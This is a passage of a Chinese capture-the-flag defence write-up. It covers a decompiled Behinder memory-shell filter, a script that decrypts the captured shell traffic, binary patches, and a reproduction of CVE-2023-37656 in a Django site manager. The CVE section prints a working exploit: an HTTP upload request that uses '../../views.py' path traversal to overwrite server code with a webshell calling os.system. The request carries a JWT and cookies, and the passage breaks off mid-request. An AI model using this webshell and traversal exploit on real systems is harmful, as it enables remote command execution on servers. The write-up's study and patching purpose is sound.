<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                getResponse = ServletRequestWrapper.class.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(lastRequest = getResponse.invoke(<span class="keyword">this</span>.request); !(lastRequest <span class="keyword">instanceof</span> RequestFacade); lastRequest = getResponse.invoke(lastRequest)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(lastResponse <span class="keyword">instanceof</span> ResponseFacade)) &#123;</span><br><span class="line">                getResponse = ServletResponseWrapper.class.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(lastResponse = getResponse.invoke(<span class="keyword">this</span>.response); !(lastResponse <span class="keyword">instanceof</span> ResponseFacade); lastResponse = getResponse.invoke(lastResponse)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map obj = <span class="keyword">new</span> HashMap();</span><br><span class="line">        obj.put(<span class="string">&quot;request&quot;</span>, lastRequest);</span><br><span class="line">        obj.put(<span class="string">&quot;response&quot;</span>, lastResponse);</span><br><span class="line">        obj.put(<span class="string">&quot;session&quot;</span>, session);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            session.putValue(<span class="string">&quot;u&quot;</span>, <span class="keyword">this</span>.Pwd);</span><br><span class="line">            Cipher c = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.Pwd.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            (<span class="keyword">new</span> BehinderFilter(<span class="keyword">this</span>.getClass().getClassLoader())).g(c.doFinal(<span class="keyword">this</span>.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            var9.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke((Object)<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>大致就是base64解码，然后aes解码，密钥给了，然后没指定加密模式，就用ecb解</p><p>下条流量只有request body了，解密脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">cipher_text = base64.b64decode(cipher_text)</span><br><span class="line">key = <span class="string">b&#x27;eac9fa38330a7535&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key, <span class="number">1</span>)</span><br><span class="line">shell = aes.decrypt(cipher_text)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.ser&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(shell)</span><br></pre></td></tr></table></figure></p><p>然后解出来序列化文件test.ser如下内容：</p><p><img src="https://s2.loli.net/2023/09/16/N5wrDPlROUVAt6n.png" alt=""></p><h2 id="实景防御"><a href="#实景防御" class="headerlink" title="实景防御"></a>实景防御</h2><p>ida对本次所有binary程序的分析和支持都是一坨💩，但是ghidra的patch功能也是一坨💩，所以patch功能基本采取ghidra分析+ida字符串定向+ida patch的模式来修复。</p><h3 id="MINIGAME、SafeNote、staticFix"><a href="#MINIGAME、SafeNote、staticFix" class="headerlink" title="MINIGAME、SafeNote、staticFix"></a>MINIGAME、SafeNote、staticFix</h3><p>通防一把🔐了，seccomp直接把execve给🐑了就彳亍</p><h3 id="ImageHost"><a href="#ImageHost" class="headerlink" title="ImageHost"></a>ImageHost</h3><p>一个图片上传服务，后端是cgi，漏洞点位于check文件扩展名的位置处：</p><p><img src="https://s2.loli.net/2023/09/16/g8ZfqVX4waMJOk7.png" alt=""></p><p>其中检测file type的逻辑如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">FUN_001013c9</span><span class="params">(<span class="keyword">char</span> *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pcVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  pcVar1 = <span class="built_in">strchr</span>(param_1,<span class="string">L&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((pcVar1 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) ||</span><br><span class="line">     (((((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;j&#x27;</span>)) || (pcVar1[<span class="number">2</span>] != <span class="string">&#x27;p&#x27;</span>)) || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;p&#x27;</span>)) || ((pcVar1[<span class="number">2</span>] != <span class="string">&#x27;n&#x27;</span> || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)))))))) &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>可以发现提取后缀名使用的是strchr函数，从左到右匹配第一个点号，此时如果用test.png.txt便可以绕过这个文件检测的逻辑</p><p>检测通过后，cgi程序会将生成的临时文件路径返回到前端，前端来读取文件内容</p><p>patch思路就是把strchr改为strrchr，希望程序能够从右向左来匹配点号，获取到最后一个后缀，虽然开了pie，但是只要查符号表的相对偏移便能获取到strrchr的got地址</p><h3 id="guide"><a href="#guide" class="headerlink" title="guide"></a>guide</h3><p>是个1day，比赛的时候👴🏻🚪找出来漏洞了，但是没patch成功，因为项目代码量太大，所以赛后复现一波。</p><p>CVE-2023-37656：<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37656">https://nvd.nist.gov/vuln/detail/CVE-2023-37656</a></p><p>整体站点是个web网址管理的东西，但是分析了一波他的django的路由之后，发现Icon处理的逻辑有问题：</p><p>在post接口中实现了文件上传，但是没有对路径和文件做任何校验，代码路径为<code>websiteapp/views.py</code>：</p><p><img src="https://s2.loli.net/2023/09/17/6FUYtLVuWi9Ns2I.png" alt=""></p><p>路由调用链为：</p><p>前端触发：<code>websitefronted/src/components/Admin/Website/index.vue -&gt; websitefronted/src/components/Admin/Website/module/editIcon.vue</code></p><p>路由：<code>/api/icon/</code></p><p>首先可以任意路径上传文件：</p><p><img src="https://s2.loli.net/2023/09/17/jMzqnduxr4NQBlP.png" alt=""></p><p>可以穿越icon路径实现目录穿越：</p><p><img src="https://s2.loli.net/2023/09/17/ePAnHKumaLNdJyg.png" alt=""></p><p>还有没有检查文件内容，可以传一个views.py，实现对IconViewSet类的get方法覆盖，并植入webshell：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"><span class="keyword">from</span> WebsiteGuide.basic <span class="keyword">import</span> CustomResponse, CustomPagination</span><br><span class="line"><span class="keyword">from</span> websiteapp <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> websiteapp.serializers.websites_serializer <span class="keyword">import</span> \</span><br><span class="line">    AllWebsiteDataSerializers, UpdateWebsiteDataSerializers, GetWebsiteDataSerializers</span><br><span class="line"><span class="keyword">from</span> websiteapp.serializers.group_serializer <span class="keyword">import</span> WebsiteGroupSerializers</span><br><span class="line"><span class="keyword">from</span> websiteapp.serializers.user_serializer <span class="keyword">import</span> UserInfoSerializer</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> ModelViewSet, ReadOnlyModelViewSet</span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter</span><br><span class="line"><span class="keyword">from</span> rest_framework.decorators <span class="keyword">import</span> action</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> authenticate</span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.settings <span class="keyword">import</span> api_settings</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.authentication <span class="keyword">import</span> JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse, JsonResponse</span><br><span class="line"><span class="keyword">from</span> django.views <span class="keyword">import</span> View</span><br><span class="line"></span><br><span class="line">jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER</span><br><span class="line">jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAuthView</span>(<span class="params">APIView</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    用户认证获取token</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        username = request.data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = authenticate(username=username, password=password)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            payload = jwt_payload_handler(user)</span><br><span class="line">            payload[<span class="string">&#x27;is_superuser&#x27;</span>] = user.is_superuser</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(&#123;<span class="string">&#x27;token&#x27;</span>: jwt_encode_handler(payload)&#125;, status=status.HTTP_200_OK)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(<span class="string">&#x27;用户名或密码错误!&#x27;</span>, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AllWebsiteDataViewSet</span>(<span class="params">ReadOnlyModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    首页分组嵌套网址数据：查询 /api/alldata/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    queryset = models.WebSiteGroup.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = AllWebsiteDataSerializers</span><br><span class="line">    <span class="comment"># authentication_classes = (JSONWebTokenAuthentication,)</span></span><br><span class="line">    <span class="comment"># permission_classes = [IsAuthenticated]</span></span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;websites__title&#x27;</span>,<span class="string">&#x27;websites__description&#x27;</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;默认参数pk修改为id&#x27;&#x27;&#x27;</span></span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebsiteDataViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    网址管理：增删改查 /api/website/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    queryset = models.WebSite.objects.<span class="built_in">all</span>()</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;description&#x27;</span>)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = (JSONWebTokenAuthentication,)</span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;默认参数pk修改为id&#x27;&#x27;&#x27;</span></span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;根据请求选择序列化器&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_serializer_class</span>(<span class="params">self</span>):</span></span><br><span class="line">        serializer_class = self.serializer_class</span><br><span class="line">        <span class="keyword">if</span> self.request.method <span class="keyword">in</span> (<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;PUT&#x27;</span>, <span class="string">&#x27;PATCH&#x27;</span>, <span class="string">&#x27;DELETE&#x27;</span>):</span><br><span class="line">            serializer_class = UpdateWebsiteDataSerializers</span><br><span class="line">        <span class="keyword">if</span> self.request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            serializer_class = GetWebsiteDataSerializers</span><br><span class="line">        <span class="keyword">return</span> serializer_class</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;重写post接口，支持批量创建&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> serializer.is_valid():</span><br><span class="line">                <span class="keyword">return</span> CustomResponse(</span><br><span class="line">                    status=status.HTTP_400_BAD_REQUEST,</span><br><span class="line">                    msg=<span class="string">&#x27;form表单校验不通过&#x27;</span>,</span><br><span class="line">                    data=&#123;<span class="string">&#x27;data&#x27;</span>: serializer.data, <span class="string">&#x27;error&#x27;</span>: serializer.errors&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> request.data:</span><br><span class="line">            serializer = self.get_serializer(data=data)</span><br><span class="line">            serializer.is_valid()</span><br><span class="line">            self.perform_create(serializer)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> CustomResponse(</span><br><span class="line">            status=status.HTTP_201_CREATED,</span><br><span class="line">            msg=<span class="string">&#x27;添加成功&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;自定义方法，实现批量删除&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @action(<span class="params">methods=[<span class="string">&#x27;delete&#x27;</span>], detail=<span class="literal">False</span>, permission_classes=[IsAuthenticated], url_path=<span class="string">&#x27;delete&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">multiple_delete</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        selectids = request.query_params.get(<span class="string">&#x27;selectId&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> selectids:</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(status=status.HTTP_404_NOT_FOUND)</span><br><span class="line">        selectid = selectids.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        selectid = [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> selectid <span class="keyword">if</span> x.split()]</span><br><span class="line">        models.WebSite.objects.<span class="built_in">filter</span>(id__in=selectid).delete()</span><br><span class="line">        <span class="keyword">return</span> CustomResponse(status=status.HTTP_204_NO_CONTENT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WebsiteGroupViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    分组管理：增删改查 /api/group/</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    queryset = models.WebSiteGroup.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = WebsiteGroupSerializers</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;name&#x27;</span>,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;默认参数pk修改为id&#x27;&#x27;&#x27;</span></span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfoViewSet</span>(<span class="params">ModelViewSet</span>):</span></span><br><span class="line">    queryset = models.UserInfo.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = UserInfoSerializer</span><br><span class="line">    filter_backends = (SearchFilter,)</span><br><span class="line">    search_fields = (<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;alias&#x27;</span>, <span class="string">&#x27;is_active&#x27;</span>,)</span><br><span class="line">    pagination_class = CustomPagination</span><br><span class="line">    permission_classes = (IsAuthenticated,)</span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication, ]</span><br><span class="line">    lookup_field = <span class="string">&#x27;pk&#x27;</span></span><br><span class="line">    lookup_url_kwarg = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @action(<span class="params">methods=[<span class="string">&#x27;post&#x27;</span>], detail=<span class="literal">True</span>, permission_classes=[IsAuthenticated],</span></span></span><br><span class="line"><span class="meta"><span class="params">            url_path=<span class="string">&#x27;change-passwd&#x27;</span>, url_name=<span class="string">&#x27;change-passwd&#x27;</span></span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change_password</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">id</span> = kwargs.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        password1 = request.data[<span class="string">&#x27;password1&#x27;</span>]</span><br><span class="line">        password2 = request.data[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">        user = models.UserInfo.objects.get(<span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">if</span> password1 == password2:</span><br><span class="line">            user.set_password(password2)</span><br><span class="line">            user.save()</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(msg=<span class="string">&quot;密码修改成功&quot;</span>, status=status.HTTP_200_OK)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> CustomResponse(msg=<span class="string">&quot;密码两次输入不一致!&quot;</span>, status=status.HTTP_400_BAD_REQUEST)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IconViewSet</span>(<span class="params">View</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, request, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">id</span> = request.GET.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        <span class="built_in">id</span> = request.POST.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        name = request.POST.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(name) == <span class="string">&quot;default.png&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&#x27;图片名称不能为default.png，请修改&#x27;</span>&#125;)</span><br><span class="line">        file = request.FILES.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        save_path = os.path.join(settings.MEDIA_ROOT, <span class="string">&#x27;icon&#x27;</span>, name)</span><br><span class="line">        ins = models.WebSite.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="built_in">id</span>).first()</span><br><span class="line">        <span class="keyword">if</span> ins:</span><br><span class="line">            ins.icon = name</span><br><span class="line">            ins.save()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">for</span> chunk <span class="keyword">in</span> file.chunks():</span><br><span class="line">                        f.write(chunk)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换成功&quot;</span>, <span class="string">&quot;detail&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换失败&quot;</span>, <span class="string">&quot;detail&quot;</span>: e&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">404</span>&#125;)</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/icon/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk1MzU1MDE5LCJlbWFpbCI6bnVsbCwiaXNfc3VwZXJ1c2VyIjp0cnVlfQ.iVvuv2UfITz7xK_qoURSBVgucNUzD4vxPsFMGqlCUaA</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------19981713787484837123326027504</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7883</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8000/admin/website</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>username-localhost-8888=&quot;2|1:0|10:1692618286|23:username-localhost-8888|44:MGJmZTUxMDJiOTBhNDNjYjg3YmZlMDQ2ZDBlMzE5ZDI=|02f839e6bab8d5f992db23c9063e1f2bf3bc9103f6e4c0b8517741819d4fa610&quot;; _xsrf=2|e2b7d629|893df11fb1e9af3dbebe64d7830b1b15|1692618286</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"></span><br><span class="line">-----------------------------19981713787484837123326027504</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------19981713787484837123326027504</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">../../views.py</span><br><span class="line">-----------------------------19981713787484837123326027504</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;poc.py&quot;</span><br><span class="line">Content-Type: text/x-python-script</span><br><span class="line"></span><br><span class="line">from django.shortcuts import render</span><br><span class="line">import subprocess</span><br><span class="line"># Create your views here.</span><br><span class="line">from WebsiteGuide.basic import CustomResponse, CustomPagination</span><br><span class="line">from websiteapp import models</span><br><span class="line">from websiteapp.serializers.websites_serializer import \</span><br><span class="line">    AllWebsiteDataSerializers, UpdateWebsiteDataSerializers, GetWebsiteDataSerializers</span><br><span class="line">from websiteapp.serializers.group_serializer import WebsiteGroupSerializers</span><br><span class="line">from websiteapp.serializers.user_serializer import UserInfoSerializer</span><br><span class="line">from rest_framework import status</span><br><span class="line">from rest_framework.views import APIView</span><br><span class="line">from rest_framework.viewsets import ModelViewSet, ReadOnlyModelViewSet</span><br><span class="line">from rest_framework.filters import SearchFilter</span><br><span class="line">from rest_framework.decorators import action</span><br><span class="line">from django.contrib.auth import authenticate</span><br><span class="line">from rest_framework.permissions import IsAuthenticated</span><br><span class="line">from rest_framework_jwt.settings import api_settings</span><br><span class="line">from rest_framework_jwt.authentication import JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">from django.conf import settings</span><br><span class="line">from django.http import HttpResponse, JsonResponse</span><br><span class="line">from django.views import View</span><br><span class="line"></span><br><span class="line">jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER</span><br><span class="line">jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserAuthView(APIView):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    用户认证获取token</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    def post(self, request, *args, **kwargs):</span><br><span class="line">        username = request.data.get(&#x27;username&#x27;)</span><br><span class="line">        password = request.data.get(&#x27;password&#x27;)</span><br><span class="line">        user = authenticate(username=username, password=password)</span><br><span class="line">        if user:</span><br><span class="line">            payload = jwt_payload_handler(user)</span><br><span class="line">            payload[&#x27;is_superuser&#x27;] = user.is_superuser</span><br><span class="line">            return 